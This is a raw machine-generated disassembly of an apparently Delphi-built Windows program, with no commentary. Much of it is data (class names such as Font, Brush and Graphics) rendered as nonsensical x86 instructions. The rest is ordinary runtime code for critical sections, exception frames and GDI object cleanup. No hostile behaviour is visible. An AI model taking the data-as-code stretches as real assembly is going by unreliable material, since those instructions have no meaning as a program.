lea eax [ eax ]
pushad
daa
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
mov ah 0x27
inc edx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
shl [ edi ] 0x1
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ edi + 0x42 ] bl
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax + ebp + 0x70070042 ] bl
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
daa
inc edx
add [ ebx + 0x422838c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
int3
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah cl
daa
inc edx
add [ esi ] al
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2820c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + ebp ] dh
inc edx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
dec eax
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x2a
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4228a090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] ch
jae r-xdata
rcr [ ecx + ebp + 0x42 ] 0x0
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
int3
popad
jb r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x29 ] bl
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4227a490
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc eax
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
mov eax eax
pop esp
sub [ edx ] eax
inc edi
jb r-xdata
add [ eax ] al
jo r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
hlt
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 2 + 0x2a ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al bh
mov es [ ecx ]
or [ eax - 0x6fefffbf ] dl
inc ecx
add [ edi + ecx * 4 ] ah
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x61 ] cl
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
call [ eax + eax * 2 ]
jo r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
inc edx
push 0x6c797453
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
nop
inc edi
and [ edx ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x295cc08b
inc edx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
inc edi
jb r-xdata
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
dec [ ebx + eax * 2 + 0x42 ]
add [ 0x6e6f4654 ] al
je r-xdata
and al 0x2b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
sub eax [ edx ]
sbb ch [ ebx ]
inc edx
add [ eax + eax ] ah
add [ eax ] al
aam 0x29
inc edx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x2a ] si
inc edx
add [ ecx + 0x41 ] bh
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x422a2090
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x4227a074
add [ esi + eax * 2 + 0x46cc0042 ] dh
jo r-xdata
inc edi
inc edx
add ah dl
inc edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
sub eax [ edx ]
pop es
sub [ edx ] eax
imul esp [ ebx + 0x73 ] 0xc08b0000
je r-xdata
add [ edx + ebp ] dh
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
jo r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
pop esp
daa
inc edx
add [ edi + eax * 2 + 0x47a40042 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
sub [ edi + 0x42 ] al
add [ edi + eax * 2 + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
inc edi
inc edx
add [ eax + 0x47 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
mov al [ 0xffffffffb4004227 ]
inc esi
inc edx
add ah cl
inc esi
imul esp [ ebx + 0x73 ] 0x27b00007
inc edx
add ah cl
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc edx
add [ eax ] bl
add [ eax ] al
jmp [ esp + eax * 2 + 0x10042 ]
add eax 0x6e6f4654
je r-xdata
and al 0x2b
inc edx
add [ edi ] al
sub al [ edx ]
inc esp
sub al [ edx ]
pop es
add [ eax ] cl
jb r-xdata
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
xchg esp eax
dec edx
inc edx
add [ edx + ecx * 2 + 0x10042 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0x26800004
inc edx
add [ eax - 0x6fffbdb7 ] cl
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
inc eax
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422c ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x42 ] bh
add [ eax + eax ] bl
add [ eax ] al
aam 0x29
inc edx
add al dh
xor al 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2a ] dh
jo r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + eax * 2 ] ah
inc edx
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ eax + 0x43 ] ch
inc edx
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x48 ] al
inc edx
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ eax + 0x48 ] ch
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov [ edx + eax * 2 ] ch
add [ edi ] al
add al 0x54
push eax
outsb
jo r-xdata
clc
add eax [ eax ]
add eax 0x74646957
push 0x2d70c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] bh
add [ eax ] bl
add [ eax ] al
add ah dl
sub [ edx ] eax
sub [ edx ] al
sbb [ eax ] al
add bh bh
push eax
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x3465646f ] al
sub [ edx ] al
dec edx
inc edx
add [ edx + ecx * 2 + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ edx + ecx * 2 + 0x4a9c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ 0x6f6c6f43 ] al
inc edx
add [ edx + ebp + 0x42 ] al
add [ eax + eax ] al
sub_422aac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] ch
inc edx
add [ ebx + ebp ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
sub eax [ edx ]
sbb ch [ ebx ]
inc edx
add [ eax + eax ] ah
add [ eax ] al
aam 0x29
inc edx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
inc edi
inc edx
add ah dl
inc edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
sub eax [ edx ]
pop es
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + eax * 2 ] ah
inc edx
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ eax + 0x43 ] ch
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2a ] dh
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
dec [ ebx + eax * 2 + 0x42 ]
add [ 0x6e6f4654 ] al
je r-xdata
inc edx
add [ eax ] bl
add [ eax ] al
jmp [ esp + eax * 2 + 0x10042 ]
add eax 0x6e6f4654
je r-xdata
and al 0x2b
inc edx
add [ edi ] al
sub al [ edx ]
inc esp
sub al [ edx ]
pop es
add [ eax ] cl
inc edi
jb r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x4227a074
add [ esi + eax * 2 + 0x46cc0042 ] dh
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
jo r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
pop esp
daa
inc edx
add [ edi + eax * 2 + 0x47a40042 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
sub [ edi + 0x42 ] al
add [ edi + eax * 2 + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
inc edi
inc edx
add [ eax + 0x47 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
mov al [ 0xffffffffb4004227 ]
inc esi
inc edx
add ah cl
inc esi
imul esp [ ebx + 0x73 ] 0x27b00007
inc edx
add ah cl
xchg esp eax
dec edx
inc edx
add [ edx + ecx * 2 + 0x10042 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0x26800004
inc edx
add [ eax - 0x6fffbdb7 ] cl
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
inc eax
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422c ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x42 ] bh
add [ eax + eax ] bl
add [ eax ] al
aam 0x29
inc edx
add al dh
xor al 0x40
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x48 ] al
inc edx
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ eax + 0x48 ] ch
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov [ edx + eax * 2 ] ch
add [ edi ] al
add al 0x54
push eax
outsb
jo r-xdata
clc
add eax [ eax ]
add eax 0x74646957
push 0x2d70c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] bh
add [ eax ] bl
add [ eax ] al
add ah dl
sub [ edx ] eax
sub [ edx ] al
sbb [ eax ] al
add bh bh
push eax
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x3465646f ] al
sub [ edx ] al
dec edx
inc edx
add [ edx + ecx * 2 + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ edx + ecx * 2 + 0x4a9c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ 0x6f6c6f43 ] al
inc edx
add [ edx + ebp + 0x42 ] al
add [ eax + eax ] al
sub_4230fc
salc
xor [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ecx ] 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbdcf ] ch
xor [ edx ] eax
sub [ eax ] al
add [ eax ] al
cmp [ edx + 0x41 ] ah
add al dh
xor al 0x40
add al cl
nop
inc ecx
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al bh
mov es [ ecx ]
or [ eax + 0x6b900041 ] dl
inc edx
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax - 0x6f ] bl
inc ecx
add [ eax ] ah
imul eax [ edx ] 0xffffffa8
sub al [ eax ]
fsubr [ ebx + 0x42 ]
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
and al 0x6d
inc edx
add [ eax ] ch
insd
inc edx
add [ eax - 0x57ffbfd6 ] ch
insd
inc edx
add [ eax + 0xc00402a ] ch
outsb
inc edx
add [ eax ] dl
outsb
inc edx
add [ eax + 0x2000402a ] ch
outsb
inc edx
add al ch
push 0x42
add [ ebp * 2 + 0x6db40042 ] ch
inc edx
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax + 0x100402a ] ch
add ch bh
inc [ eax + 0x800426d ]
push esp
inc edi
jb r-xdata
int1
xor [ edx ] eax
push [ ecx ]
inc edx
add [ ecx ] cl
jo r-xdata
add [ eax ] al
add [ eax - 0x27ffbdce ] ch
inc edx
add cl ch
xor [ edx ] eax
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
xor al [ edx ]
loope r-xdata
imul esp [ ebx - 0x73 ] 0x31c00040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
add [ eax + 0x76 ] dl
inc edx
add ah cl
jl r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx + 0x44 ] 0xbc004231
bound eax [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
insd
popad
lea eax [ bx + si ]
movsb [ edi ] [ esi ]
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x33
inc edx
add [ eax + eax ] ah
add [ eax ] al
clc
jo r-xdata
cwde
xor al [ edx ]
mov esp 0x4162
add [ eax ] cl
inc edi
jb r-xdata
add [ edx + edi * 2 ] dh
inc edx
add [ eax - 0x6f ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2a ] dh
inc edx
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
xor al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0xc8004232
xor al [ edx ]
sub al 0x0
add [ eax ] al
cmp [ edx + 0x41 ] ah
add al dh
xor al 0x40
add al cl
nop
inc ecx
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] ah
jbe r-xdata
inc edx
add al bl
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fst [ esi ]
xor al [ edx ]
aam 0x11
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
cwde
xor al [ edx ]
sub dh [ edx ]
inc edx
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_427a04
xor al [ edx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004233 ] ch
add [ eax ] al
add al bh
imul esp [ ebx + 0x73 ] 0x44900000
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xor eax [ edx ]
or [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x57ffbfce ] bl
sub al [ eax ]
or al 0x54
push ebx
push 0x64657261
dec ecx
sub_42372a
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x42 ] dh
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al bl
aaa
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
sub bh dh
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
call sub_40365c
mov eax esi
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_42379c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4237d8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_423814
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_423788
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4237fc
xor edx edx
push ebp
push sub_4238e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238ef
mov eax [ ebp - 0x4 ]
call sub_423808
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407fd4
test al al
je r-xdata
sub_4238f8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4237fc
xor ecx ecx
push ebp
push sub_42397f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423808
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_4239a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4237fc
xor eax eax
push ebp
push sub_423a11
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423814
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4238f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a18
mov eax [ ebp - 0x4 ]
call sub_423808
retn
mov eax ebx
mov si 0xfffd
call sub_4034a4
sub_423a20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
